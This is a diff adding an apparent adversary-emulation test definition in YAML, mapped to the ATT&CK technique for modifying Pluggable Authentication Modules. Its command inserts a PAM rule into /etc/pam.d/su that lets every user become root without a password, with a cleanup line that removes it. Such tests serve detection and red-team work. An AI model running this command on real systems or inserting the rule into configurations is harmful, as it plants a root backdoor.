@@ -1,0 +1,21 @@
+---
+- id: d8a130f9f785ddf336786d37e6b3bf05
+  name: Malicious PAM rule (freebsd)
+  description: 'Inserts a rule into a PAM config and then tests it.
+
+
+    Upon successful execution, this test will insert a rule that allows every user
+    to su to root without a password.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1556.003
+    name: 'Modify Authentication Process: Pluggable Authentication Modules'
+  platforms:
+    linux:
+      sh:
+        command: sudo sed -i "" "8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"
+          /etc/pam.d/su
+        payloads: []
+        cleanup: sudo sed -i "" "/auth sufficient pam_succeed_if.so uid >= 0/d" /etc/pam.d/su
